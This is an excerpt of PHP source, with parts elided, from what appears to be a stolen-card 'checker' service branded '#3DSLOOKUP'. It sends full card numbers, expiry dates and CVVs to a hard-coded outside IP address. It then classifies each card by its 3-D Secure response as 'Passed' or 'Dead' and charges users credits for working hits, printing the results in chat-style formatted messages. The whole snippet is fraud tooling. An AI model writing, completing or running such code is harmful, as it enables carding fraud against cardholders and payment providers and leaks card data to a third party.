...
$requestUrl = "http://206.206.78.217:1555/?cc={$cc}|{$month}|{$year}|{$cvv}";
...
if (stripos($response, 'authenticate_successful') !== false)  {
    $err = 'Authenticate Successful';
    $newCredits = updateCredits($pdo, $uid, 1, false, true);
    $fullResult = "<b>#3DSLOOKUP</b>\n" .
                  "━━━━━━━━━━━\n" .
                  "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
                  "[ﾒ] <b>Status ➜</b> 𝗣𝗮𝘀𝘀𝗲𝗱 ✅\n" .
                  "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
                  "[ﾒ] <b>Gateway ➜</b>  3DS LOOKUP\n" .
                  "━━━━━━━━━━━\n" .
    ...
    exit;
} elseif (stripos($response, 'authenticate_attempt_successful') !== false) {
    $err = 'Authenticate Attempt Successful';
    $newCredits = updateCredits($pdo, $uid, 1, true, false);
    $fullResult = "<b>#3DSLOOKUP</b>\n" .
                  "━━━━━━━━━━━\n" .
                  "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
                  "[ﾒ] <b>Status ➜</b> 𝗣𝗮𝘀𝘀𝗲𝗱 ✅\n" .
    ...
    exit;
}elseif (stripos($response, 'authentication_unavailable') !== false) {
    ...
    exit;
}elseif (stripos($response, 'challenge_required') !== false) {
    ...
    exit;
}elseif (stripos($response, 'authenticate_frictionless_failed') !== false) {
    $err = 'Authenticate Frictionless Failed';
    $newCredits = updateCredits($pdo, $uid, 0); // No credit deduction for Dead
    ...
    exit;
}elseif (stripos($response, 'authenticate_rejected') !== false) {
    $err = 'Authenticate Rejected';
    $newCredits = updateCredits($pdo, $uid, 0); // No credit deduction for Dead
    ...
    exit;
} elseif ((stripos($response, 'lookup_card_error') !== false) || (stripos($response, 'lookup_error') !== false)) {
    $err = 'Lookup Card Error';
    $newCredits = updateCredits($pdo, $uid, 0); // No credit deduction for Dead
    ...
    exit;
} elseif ((stripos($response, 'unsupported_card') !== false)) {
